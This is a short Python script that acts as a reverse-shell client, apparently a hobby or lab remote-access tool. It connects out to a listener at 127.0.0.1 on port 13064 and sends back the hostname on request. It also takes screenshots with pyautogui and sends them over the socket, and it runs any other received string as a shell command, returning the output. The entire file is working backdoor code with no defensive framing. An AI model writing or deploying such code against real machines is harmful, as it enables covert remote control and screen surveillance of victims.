import socket
import subprocess
import pyautogui

IP = "127.0.0.1"
PORT = 13064        

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((IP, PORT))
    print(f"Connected to {IP}:{PORT}")

    while True:
        try:
            data = sock.recv(1024).decode().lower()

            if data == "name":
                sock.send(socket.gethostname().encode())
            elif data == "exit":
                sock.close()
                exit(0)
            elif data == "screenshot":
                try:
                    screenshot = pyautogui.screenshot()
                    screenshot.save('./screenshot.png')

                    # Send the screenshot file size first
                    with open('./screenshot.png', 'rb') as f:
                        file_data = f.read()
                        sock.sendall(len(file_data).to_bytes(4, 'big'))
                        sock.sendall(file_data)

                    sock.send("Screenshot sent.".encode())
                except Exception as e:
                    sock.send(f"Failed to take screenshot: {str(e)}".encode())
            else:
                try:
                    # Run the command received
                    result = subprocess.run(data, shell=True, capture_output=True, text=True)

                    # If there's output, send it back to the server
                    if result.stdout:
                        sock.send(result.stdout.encode())
                    elif result.stderr:
                        sock.send(result.stderr.encode())
                    else:
                        # No output was produced
                        sock.send("Command executed, no output.".encode())
                except Exception as e:
                    sock.send(f"Error executing command: {str(e)}".encode())
        except KeyboardInterrupt:
            print("\nClosing socket.")
            sock.close()
            exit(0)


except KeyboardInterrupt:
    print("\nClosing socket.")
    sock.close()
    exit(0)
